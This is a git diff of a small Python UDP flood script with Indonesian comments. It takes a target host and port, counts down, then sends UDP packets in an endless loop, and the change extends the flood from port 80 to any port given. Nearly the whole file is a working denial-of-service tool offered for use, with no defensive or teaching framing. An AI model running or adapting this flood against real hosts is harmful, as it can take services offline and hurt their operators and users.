@@ -1,18 +1,19 @@
 import socket
+import time
+import os
 import sys
 import optparse
-import os
-import time
 
 count = 0
 
-setting = optparse.OptionParser()
-setting.add_option("--host", dest="host")
-setting.add_option("--port", dest="port")
-opts , args = setting.parse_args()
+jancok = optparse.OptionParser()
+jancok.add_option("--host", dest="host")
+jancok.add_option("--port", dest="port")
+opts , args = jancok.parse_args()
 host = opts.host
 port = opts.port
 
+# warna text
 class colors:
     PURPLE = '\033[95m'
     RED = '\033[31m'
@@ -27,9 +28,11 @@ class colors:
     UNDERLINE = '\033[4m'
     YELLOW = '\033[33m'
 
+# cara pemakaian
 class helps:
 	def __init__(self):
-		print("""{} __  __  ____    ____           ___  ___                       __     
+		print("""
+{} __  __  ____    ____           ___  ___                       __     
 /\ \/\ \/\  _`\ /\  _`\       /'___\/\_ \                     /\ \    
 \ \ \ \ \ \ \/\ \ \ \L\ \    /\ \__/\//\ \     ___     ___    \_\ \   
  \ \ \ \ \ \ \ \ \ \ ,__/    \ \ ,__\ \ \ \   / __`\  / __`\  /'_` \  
@@ -41,11 +44,15 @@ class helps:
 --port = Untuk memasukkan nomor port(80)
 {}""".format(colors.PURPLE,colors.ENDC))
 
+
 	def dos():
-		global host,port,count
+		global count,host,port
+		# IPV4 dan UDP
 		sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
+		# mengubah dns menjadi ip server
 		ip = socket.gethostbyname(host)
-		print("{}IP = {} port = {}".format(colors.RED,ip,port))
+		print("{}IP = {} port = {}".format(colors.PURPLE , ip , port))
+		time.sleep(1)
 		print("Hitungan mundur dalam 3")
 		time.sleep(1)
 		print("Hitungan mundur dalam 2")
@@ -55,12 +62,18 @@ class helps:
 		os.system("clear")
 		time.sleep(1)
 		while(True):
-			request = "GET / \nHTTP/1.1\n HOST: {}\n".format(host).encode()
-			count += 1
-			print("{}Melakukan request sebanyak {} kali{}".format(colors.PURPLE,count,colors.ENDC))
-			sock.sendto(request,(str(ip) , int(port)))
+			if port == "80":
+				request = "GET / \nHTTP/1.1\n HOST: {}\n".format(host).encode()
+				sock.sendto(request,(str(ip),int(port)))
+				count += 1
+				print("{}Melakukan request sebanyak {} kali{}".format(colors.PURPLE , count ,  colors.ENDC))
+			else:
+				request = "helloworldorldorldorlo".encode()
+				sock.sendto(request,(str(ip),int(port)))
+				count += 1
+				print("{}Melakukan request sebanyak {} kali{}".format(colors.PURPLE , count ,  colors.ENDC))
 
 if len(sys.argv) == 1:
 	helps()
-if port == "80":
+if port:
 	helps.dos()
